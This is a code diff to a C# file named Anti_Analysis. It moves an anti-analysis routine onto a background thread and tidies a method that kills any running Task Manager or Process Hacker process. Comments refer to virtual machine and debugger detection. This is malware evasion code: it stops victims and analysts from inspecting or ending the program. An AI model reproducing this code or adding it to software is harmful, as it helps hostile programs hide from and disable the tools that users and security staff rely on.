@@ -19,7 +19,10 @@ namespace Anti_Analysis
         static void Main()
         {
 
-            RunAntiAnalysis();
+            new Thread(() =>
+            {
+                RunAntiAnalysis();
+                }).Start();
 
             //Console.WriteLine($"VirtualMachine = {DetectVirtualMachine()}");
             //Console.WriteLine($"Debugger = {DetectDebugger()}");
@@ -78,19 +81,19 @@ namespace Anti_Analysis
 
         private static void DetectProcess()
         {
-            foreach (Process p in Process.GetProcesses())
+            foreach (Process process in Process.GetProcesses())
             {
                 try
                 {
-                    if (processName.Contains(p.ProcessName))
-                        p.Kill();
+                    if (ProcessName.Contains(process.ProcessName))
+                        process.Kill();
                 }
                 catch { }
             }
         }
 
 
-        private readonly static List<string> processName = new List<string> { "ProcessHacker", "taskmgr" };
+        private readonly static List<string> ProcessName = new List<string> { "ProcessHacker", "taskmgr" };
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
